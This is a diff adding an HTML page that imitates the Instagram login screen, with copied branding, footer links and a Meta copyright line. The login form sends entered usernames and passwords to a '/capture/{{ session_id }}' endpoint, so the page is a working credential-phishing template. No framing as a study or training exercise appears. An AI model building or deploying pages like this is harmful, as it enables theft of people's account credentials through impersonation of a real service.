@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+    background:#fafafa;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    flex-direction:column
+}
+#wrapper{max-width:350px;width:100%;padding:0 12px}
+.logo{text-align:center;margin:36px 0 12px}
+.logo svg{width:175px;height:51px}
+.card{
+    background:#fff;
+    border:1px solid #dbdbdb;
+    border-radius:1px;
+    padding:40px 40px 20px;
+    margin-bottom:10px
+}
+.card form{display:flex;flex-direction:column}
+input{
+    width:100%;
+    padding:9px 0 7px 8px;
+    background:#fafafa;
+    border:1px solid #dbdbdb;
+    border-radius:3px;
+    font-size:12px;
+    outline:none;
+    color:#262626;
+    margin-bottom:6px
+}
+input:focus{border-color:#a8a8a8}
+button{
+    width:100%;
+    padding:7px 16px;
+    background:#0095f6;
+    border:none;
+    border-radius:8px;
+    color:#fff;
+    font-weight:600;
+    font-size:14px;
+    cursor:pointer;
+    margin-top:8px;
+    opacity:.7
+}
+button:hover{opacity:1}
+.or{display:flex;align-items:center;margin:18px 0;color:#8e8e8e;font-size:13px;font-weight:600}
+.or::before,.or::after{content:'';flex:1;height:1px;background:#dbdbdb}
+.or span{margin:0 18px}
+.fb{text-align:center;margin:8px 0;color:#385185;font-weight:600;font-size:14px;cursor:pointer}
+.fb svg{width:20px;height:20px;vertical-align:middle;margin-right:8px}
+.forgot{text-align:center;margin-top:12px}
+.forgot a{color:#00376b;text-decoration:none;font-size:12px}
+.signup{
+    background:#fff;
+    border:1px solid #dbdbdb;
+    border-radius:1px;
+    padding:20px 40px;
+    text-align:center;
+    font-size:14px;
+    color:#262626
+}
+.signup a{color:#0095f6;font-weight:600;text-decoration:none}
+.app{text-align:center;margin:20px 0;font-size:14px;color:#262626}
+.stores{display:flex;justify-content:center;gap:8px;margin-top:12px}
+.stores a{display:inline-block}
+.footer{max-width:350px;margin:0 auto 52px;text-align:center;font-size:12px;color:#8e8e8e;line-height:1.8;padding:0 12px}
+.footer a{color:#8e8e8e;text-decoration:none;margin:0 8px}
+.footer a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+<div id="wrapper">
+    <div class="card">
+        <div class="logo">
+            <svg viewBox="0 0 175 51"><use href="#instagram-logo"/></svg>
+            <svg id="instagram-logo" style="display:none">
+                <linearGradient id="ig-grad" x1="0" y1="0" x2="1" y2="1">
+                    <stop offset="0%" stop-color="#f09433"/>
+                    <stop offset="25%" stop-color="#e6683c"/>
+                    <stop offset="50%" stop-color="#dc2743"/>
+                    <stop offset="75%" stop-color="#cc2366"/>
+                    <stop offset="100%" stop-color="#bc1888"/>
+                </linearGradient>
+                <text x="0" y="45" font-family="Arial,sans-serif" font-size="44" font-weight="bold" fill="url(#ig-grad)">Instagram</text>
+            </svg>
+        </div>
+        <form action="/capture/{{ session_id }}" method="POST">
+            <input type="text" name="username" placeholder="Mobile number, username or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log in</button>
+        </form>
+        <div class="or"><span>OR</span></div>
+        <div class="fb">
+            <svg viewBox="0 0 16 16" width="20" height="20" fill="#385185"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>
+            Log in with Facebook
+        </div>
+        <div class="forgot"><a href="#">Forgot password?</a></div>
+    </div>
+    <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+    <div class="app">Get the app.</div>
+    <div class="stores">
+        <a href="#"><svg viewBox="0 0 135 40" width="135" height="40"><rect width="135" height="40" rx="4" fill="#000"/><text x="20" y="24" fill="#fff" font-size="10" font-weight="bold">App Store</text></svg></a>
+        <a href="#"><svg viewBox="0 0 135 40" width="135" height="40"><rect width="135" height="40" rx="4" fill="#000"/><text x="20" y="24" fill="#fff" font-size="10" font-weight="bold">Google Play</text></svg></a>
+    </div>
+    <div class="footer">
+        <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a> <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a> <a href="#">Locations</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a> <a href="#">Contact Uploading & Non-Users</a> <a href="#">Meta Verified</a><br>
+        <span>English</span> &copy; 2025 Instagram from Meta
+    </div>
+</div>
+</body>
+              </html>
